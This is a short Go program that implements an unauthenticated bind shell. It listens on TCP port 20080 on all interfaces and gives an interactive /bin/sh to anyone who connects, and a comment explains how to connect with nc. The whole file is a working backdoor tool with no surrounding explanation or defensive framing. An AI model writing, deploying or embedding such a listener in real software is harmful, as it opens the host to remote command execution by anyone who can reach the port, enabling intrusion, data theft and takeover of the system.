package main

import (
	"fmt"
	"log"
	"net"
	"os/exec"
)

func handle(conn net.Conn) {
	cmd := exec.Command("/bin/sh", "-i")
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn // optional: redirects error output over the connection too
	cmd.Run()
	conn.Close()
}

func main() {
	// Use nc 127.0.0.1 20080 instead of telnet for connecting, since telnet command sends CR LF to end each line
	address := ":20080"
	fmt.Printf("Listening on %s\n", address)
	listener, err := net.Listen("tcp", address)
	if err != nil {
		log.Fatalln(err)
	}

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln(err)
		}
		go handle(conn)
	}
}
